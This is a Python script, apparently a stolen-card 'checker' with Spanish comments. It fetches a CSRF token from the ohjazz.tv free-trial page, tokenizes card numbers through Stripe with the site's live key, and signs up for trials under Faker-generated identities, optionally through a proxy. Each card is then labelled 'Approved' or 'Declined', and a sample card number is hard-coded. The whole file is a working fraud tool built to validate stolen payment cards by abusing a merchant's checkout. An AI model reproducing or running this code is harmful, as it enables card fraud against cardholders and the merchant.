import asyncio, aiohttp, random, sys, traceback
from faker import Faker
f = Faker("en_US")

proxy = None # Aquí la proxie en formato http://user:password@host:port o http://ip:port
#=============== CONTROL DE DATOS FAK ==================
email = lambda: f"{f.user_name()}@{random.choice(["hotmail.com", "gmail.com", "yahoo.com", "outlook.com"])}"
password = lambda: f.password(length=6) #Permitiendo todo, limitando el lenght
name = lambda: f"{f.first_name().replace(" ", "").replace(".", "")}|{f.last_name()}"
postcode = lambda: ''.join(str(random.randint(0, 9)) for _ in range(5))
#=============== CONTROL DE DATOS FAK - END ============

def found(html, start, end):
    try:
        star = html.index(start) + len(start)
        end = html.index(end, star)
        return html[star:end]
    except ValueError:
        return "None"
        
async def main(card):
	async with aiohttp.ClientSession(
	proxy=proxy
	) as session:
			try:
				cc = card.strip().replace("/", "|").replace(":", "|")
				num, mes, ano,cvv = cc.split("|")
				mes = "0"+mes if len(mes)==1 else mes
				ano = ano[-2:] if len(ano)==4 else ano
				headers = {"sec-ch-ua-platform": "Windows", "upgrade-insecure-requests": "1","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", "sec-gpc": "1", "accept-language": "es-MX,es;q=0.8",}
				async with session.get("https://register.ohjazz.tv/free-trial", headers=headers) as r1:
					r1t = await r1.text()
					crsft = found(r1t, 'name="csrf-token" content="', '"')
				headers["content-type"]="application/x-www-form-urlencoded"
				data =  f"""guid=NA&muid=NA&sid=NA&referrer=https%3A%2F%2Fregister.ohjazz.tv&time_on_page=53403&card[number]={num}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&payment_user_agent=stripe.js%2F668d00c08a%3B+stripe-js-v3%2F668d00c08a%3B+split-card-element&client_attribution_metadata[client_session_id]=f3aa7db3-8407-41d1-bf9e-9bfd8de417ec&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=6ee68c90-7822-4d7f-ac02-a3716acfb2bd&key=pk_live_51K9o9cCdiyMESuFXV3d7e04uyUPCMA5vPZ2oY0NmsRWDonK6l3raWJ8lGwM8UP7852BcLcDwGSnNC7LVeg5ZpWR400nmh8o3Mv"""
				async with session.post("https://api.stripe.com/v1/tokens", headers=headers, data=data) as r2:
					r2t = await r2.text();r2j = await r2.json(content_type=None)
					tk_id = r2j["id"] if r2j.get("id") else "Error"
				headers["content-type"] = "application/json"
				headers["x-csrf-token"] = crsft
				nm = name().split("|")
				data = { "token": tk_id, "email": email(),"first_name": nm[0],"last_name": nm[1], "password": password(), "package_name": "Mensual","plan_id": "1", "coupon_code": "" }
				async with session.post("https://register.ohjazz.tv/subscription_trial", headers=headers, json=data, allow_redirects=False) as r3:
					r3t = await r3.text()
					r3j = await r3.json() if "error" in r3t else {}
				if "Your card was declined." in r3t:
					return {"cc": cc, "status": "Declined ❌", "message": "Your card was declined."}
				elif "<title>Redirecting to https://register.ohjazz.tv</title>" in r3t:
					return {"cc": cc, "status": "Approved ✅", "message": "Cuenta creada exitosamente ✅"}
				elif "Your card's security code is incorrect." in r3t:
					return  {"cc": cc, "status": "Approved ✅", "message": "Your card's security code is invalid."}
				elif "error" in r3t:
					return {"cc": cc, "status": "Declined ❌", "message": r3j.get("error", 'No error, try again')}
				else:
					return  {"cc": cc, "status": "Declined ❌", "message": r3t[:5]}
					
			except Exception as e:
				tb = sys.exc_info()[2];lin = tb.tb_lineno
				return {"cc": cc, "status": "Error ⚠️", "message": e}
				
# USO
resp = asyncio.run(main("4147098567014048|01|2027|569"))
print(resp)
